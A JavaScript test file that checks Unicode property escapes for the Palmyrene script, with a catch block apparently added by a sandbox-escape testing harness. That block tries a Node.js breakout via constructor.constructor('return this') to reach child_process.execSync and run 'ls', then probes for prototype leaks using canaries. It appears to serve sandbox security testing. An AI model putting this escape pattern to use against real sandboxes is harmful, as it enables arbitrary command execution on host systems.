try {
    const matchSymbols = buildString({
        loneCodePoints: [],
        ranges: [[
                67680,
                67711
            ]]
    });
    testPropertyEscapes(/^\p{Script=Palmyrene}+$/u, matchSymbols, '\\p{Script=Palmyrene}');
    testPropertyEscapes(/^\p{Script=Palm}+$/u, matchSymbols, '\\p{Script=Palm}');
    testPropertyEscapes(/^\p{sc=Palmyrene}+$/u, matchSymbols, '\\p{sc=Palmyrene}');
    testPropertyEscapes(/^\p{sc=Palm}+$/u, matchSymbols, '\\p{sc=Palm}');
    const nonMatchSymbols = buildString({
        loneCodePoints: [],
        ranges: [
            [
                56320,
                57343
            ],
            [
                0,
                56319
            ],
            [
                57344,
                67679
            ],
            [
                67712,
                1114111
            ]
        ]
    });
    testPropertyEscapes(/^\P{Script=Palmyrene}+$/u, nonMatchSymbols, '\\P{Script=Palmyrene}');
    testPropertyEscapes(/^\P{Script=Palm}+$/u, nonMatchSymbols, '\\P{Script=Palm}');
    testPropertyEscapes(/^\P{sc=Palmyrene}+$/u, nonMatchSymbols, '\\P{sc=Palmyrene}');
    testPropertyEscapes(/^\P{sc=Palm}+$/u, nonMatchSymbols, '\\P{sc=Palm}');
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}